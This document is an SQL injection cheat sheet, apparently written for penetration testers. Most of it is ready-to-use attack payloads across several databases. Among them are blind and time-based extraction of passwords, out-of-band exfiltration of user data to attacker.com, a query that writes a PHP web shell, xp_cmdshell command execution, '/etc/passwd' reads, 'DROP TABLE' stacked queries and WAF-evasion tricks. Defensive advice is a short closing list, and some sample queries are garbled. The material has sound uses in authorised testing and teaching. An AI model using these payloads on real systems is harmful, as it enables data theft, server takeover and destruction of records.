---
title: SQL Injection
---

# SQL Injection

**SQL Injection (SQLi)** is a class of injection vulnerabilities that allows an attacker to interfere with the queries an application makes to its database. It can lead to unauthorized data access, data modification, or even remote code execution, depending on the database and context.

- **Manual Detection**:
    - Inject single quotes (`'`), double quotes (`"`), semicolons (`;`), comment markers (`-`, `#`), and logical operators (`AND`, `OR`).
    - Observe changes in response, structure, timing, headers, or error messages.

DBMS Identification

| **DBMS** | **Example Error Message** | **Example Payload** |
| --- | --- | --- |
| MySQL | `You have an error in your SQL syntax; ... near '' at line 1` | `'` |
| PostgreSQL | `ERROR: unterminated quoted string at or near "'"` | `'` |
| PostgreSQL | `ERROR: syntax error at or near "1"` | `1'` |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.` | `'` |
| Microsoft SQL Server | `Incorrect syntax near ''.` | `'` |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'` |
| Oracle | `ORA-00933: SQL command not properly ended` | `'` |
| Oracle | `ORA-01756: quoted string not properly terminated` | `'` |
| Oracle | `ORA-00923: FROM keyword not found where expected` | `1'` |

---

## Fundamentals of SQL Injection

SQL Injection occurs when untrusted input is concatenated into a SQL query instead of being treated as data. The database interprets the attacker-controlled input as part of the SQL command.

Typical vulnerable pattern:

```
SELECT*FROM usersWHERE username='$input';
```

Safe pattern:

```
SELECT*FROM usersWHERE username= ?;
```

Key things to identify during testing:

- Where user input reaches a SQL query.
- Whether the input is quoted as a string or treated as a number.
- Whether multiple statements are allowed.
- Whether errors, delays, or external interactions are observable.

## **Types of SQL Injection**

### **1. Error-Based SQLi**

### **Payloads (Database-Specific)**

**MySQL**:

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**MSSQL**:

```
' OR 1=CONVERT(int,@@version)--
```

**Oracle**:

```
' AND 1=(SELECT utl_inaddr.get_host_address((SELECT user FROM dual)||'.attacker.com')--
```

**PostgreSQL**:

```
' AND 1=CAST((SELECT version()) AS int)--
```

---

### **2. Union-Based SQLi (Bypassing Restrictions)**

✔ **When UNION is blocked, try:**

- **Subqueries**
- **Alternative syntax (e.g., `UNION DISTINCT`)**

### **Bypassing Column Mismatch**

```
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,'a',3--
```

### **Extracting Data Without UNION**

```
' AND (SELECT SUBSTRING((SELECT @@version),1,1))='M'--
```

---

### **3. Blind SQLi (Time & Boolean-Based)**

✔ **No direct output? Use delays or boolean conditions.**

### **Time-Based Detection (Database-Specific Delays)**

**MySQL**:

```
' OR IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)--
```

**PostgreSQL**:

```
' OR (SELECT CASE WHEN (SUBSTRING((SELECT version()),1,1)='P') THEN pg_sleep(5) ELSE NULL END)--
```

**MSSQL**:

```
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--
```

**Oracle**:

```
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)--
```

### **Boolean-Based (Brute-Force Characters)**

```
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))) > 50--
```

---

### **4. Out-of-Band (OOB) SQLi (DNS/HTTP Exfiltration)**

✔ **When in-band methods fail, force external interactions.**

### **DNS Exfiltration (Oracle)**

```
' AND (SELECT UTL_HTTP.REQUEST('http://'||(SELECT username FROM all_users WHERE rownum=1)||'.attacker.com') FROM dual) IS NOT NULL--
```

### **HTTP Exfiltration (MSSQL)**

```
'; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\'--
```

### **PostgreSQL (HTTP Request)**

```
' || (SELECT http_get('http://attacker.com/'||(SELECT current_database())))--
```

---

## Attack Surface

Look for user-controlled input that may be used in database queries:

- URL parameters (`?id=1`, `?search=test`)
- POST body fields
- JSON request bodies
- HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Cookies and session values
- GraphQL variables
- XML / SOAP parameters
- Search, filter, sort, and pagination parameters
- File metadata (CSV, XML, XLSX imports)

---

## Common Injection Scenarios & Test Cases

| Scenario | Payload Example |
| --- | --- |
| **Numeric Parameter** | `id=1 OR 1=1` |
| **String Parameter** | `name=' OR '1'='1` |
| **Comment Injection** | `name=foo';--` |
| **Stacked Queries** | `'; DROP TABLE users;--` |
| **Boolean‑Blind Enumeration** | `id=1 AND (SELECT COUNT(*) FROM users)>0` |
| **Time‑Blind Enumeration** | `id=1 WAITFOR DELAY '0:0:5'` (MSSQL) / `id=1 SLEEP(5)` (MySQL) |
| **Union‑Injection** | `id=1 UNION SELECT user(),version(),database()--` |
| **Out‑of‑Band DNS** | Payload invoking UTL_INADDR or xp_dirtree as above |

---

## **Advanced Scenarios & Bypasses**

### **1. WAF/Filter Evasion Techniques**

✔ **Case Manipulation**: **`SeLeCt`**

✔ **Inline Comments**: **`SEL/**/ECT`**

✔ **Hex/Unicode Encoding**: **`SELECT`** → **`\x53\x45\x4C\x45\x43\x54`**

✔ **Double Encoding**: **`'`** → **`%2527`**

✔ **Overlong UTF-8**: **`'`** → **`%C0%A7`**

### **Bypassing Spaces**

```
'/**/OR/**/1=1--
'%09OR%091=1--
```

### **Bypassing Quote Filters**

```
' OR 1=1--
" OR 1=1--
` OR 1=1--
```

---

### **2. Second-Order SQL Injection**

✔ **Stored payload executes later (e.g., profile updates, logs).**

**Example**:

1. Register username: **`admin'--`**
2. Change password:
    
    ```
    UPDATE users SET password='hacked' WHERE username='admin'--'
    ```
    

---

## **Database-Specific Exploitation**

### **1. MySQL**

✔ **Read Files**:

```
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

✔ **Write Files**:

```
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'--
```

✔ **Command Execution (If Privileged)**:

```
' UNION SELECT sys_exec('id')--
```

---

### **2. MSSQL**

✔ **Command Execution (xp_cmdshell)**:

```
'; EXEC xp_cmdshell 'whoami'--
```

✔ **Linked Server Attack**:

```
'; EXEC('sp_addlinkedserver ''attacker'', ''SQLOLEDB'', ''sqlserver'';')--
```

---

### **3. Oracle**

✔ **Java Execution (If Enabled)**:

```
' AND (SELECT dbms_java.runjava('oracle/aurora/util/Wrapper c:\\windows\\system32\\calc.exe') FROM dual)--
```

✔ **File Read (UTL_FILE)**:

```
' AND (SELECT UTL_FILE.FOPEN('/etc', 'passwd', 'R') FROM dual)--
```

---

## Detection Techniques

### Manual Detection

- Insert `'`, `"`, `)`, `))`, `-`, `#`, and `/*` to trigger syntax changes.
- Use `AND 1=1` and `AND 1=2` to compare responses.
- Test time delays (`SLEEP`, `WAITFOR`, `pg_sleep`) and measure response time.
- Check for reflected database errors, status-code changes, content-length differences, and redirect behavior.
- Compare authenticated vs unauthenticated requests for hidden query paths.

### Automated Detection

- sqlmap: fingerprinting, enumeration, and exploitation.
- Burp Suite: Scanner, Repeater, and Intruder for manual validation.
- Nuclei: SQLi templates for quick coverage.
- OWASP ZAP: active and passive SQLi checks.

---

## **Automation & Tools**

### **1. sqlmap (Advanced Usage)**

✔ **Basic Scan**:

```
sqlmap -u "http://example.com?id=1" --batch --risk=3 --level=5
```

✔ **OOB Exfiltration**:

```
sqlmap -u "http://example.com?id=1" --dns-domain=attacker.com
```

✔ **WAF Bypass (Tamper Scripts)**:

```
sqlmap -u "http://example.com?id=1" --tamper=space2comment
```

---

### **2. Manual Exploitation (Burp Suite)**

✔ **Intruder for Boolean-Based Blind SQLi**

✔ **Collaborator for OOB Detection**

---

## Less Known Databases

SQL Injection techniques vary across different database engines. Below are examples and useful notes for some less commonly encountered systems:

---

### **1. Informix**

- **Error-Based Detection**:
    
    ```sql
    ' OR 1=1--
    ```
    
- **Stacked Queries** are supported:
    
    ```sql
    '; DROP TABLE users;--
    ```
    
- **Comment Styles**: `{--}`, `{#}`, `{/* */}`
- **Concatenation**:
    
    ```sql
    ' || 'abc' = 'abc' -- TRUE
    ```
    

---

### **2. Ingres**

- **Typical Error Message**:
    
    `Syntax error at or near...`
    
- **Union Injection**:
    
    ```sql
    ' UNION SELECT CURRENT_USER--
    ```
    
- **Time-Based** (if available):
    
    ```sql
    SELECT SLEEP(5);
    ```
    

---

### **3. DB2 (IBM)**

- **Version Extraction**:
    
    ```sql
    SELECT service_level FROM TABLE (sysproc.env_get_inst_info());
    ```
    
- **Bypass** using NULL values:
    
    ```sql
    ' UNION SELECT NULL, user, current schema FROM sysibm.sysdummy1--
    ```
    
- **Comments**: `-`, `/* */`
- **Sleep (Requires UDF)**:
    
    DB2 lacks built-in sleep, requires external functions.
    

---

## Impact

Successful SQL Injection can lead to:

- Authentication bypass
- Unauthorized access to sensitive data
- Database enumeration
- Modification or deletion of records
- Privilege escalation within the database
- File read/write on the host (where supported)
- Server-side command execution through database features
- Complete compromise of the application and connected systems

## **Defensive Measures**

✔ **Prepared Statements (Parameterized Queries)**

✔ **Strict Input Validation (Whitelisting)**

✔ **Least Privilege DB Accounts**

✔ **Web Application Firewall (WAF) Rules**

✔ **Disable Dangerous Functions (xp_cmdshell, UTL_FILE, etc.)**

---

## Good to Read:

https://hackerone.com/reports/1046084

https://hackerone.com/reports/273946

https://hackerone.com/reports/923020

---

## References:

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1](https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1)

[https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)

[https://usamaazad.medium.com/dns-based-out-of-band-blind-sql-injection-in-oracle-dumping-data-45f506296945](https://usamaazad.medium.com/dns-based-out-of-band-blind-sql-injection-in-oracle-dumping-data-45f506296945)

[https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b](https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

[https://owasp.org/www-community/attacks/Blind_SQL_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

[https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)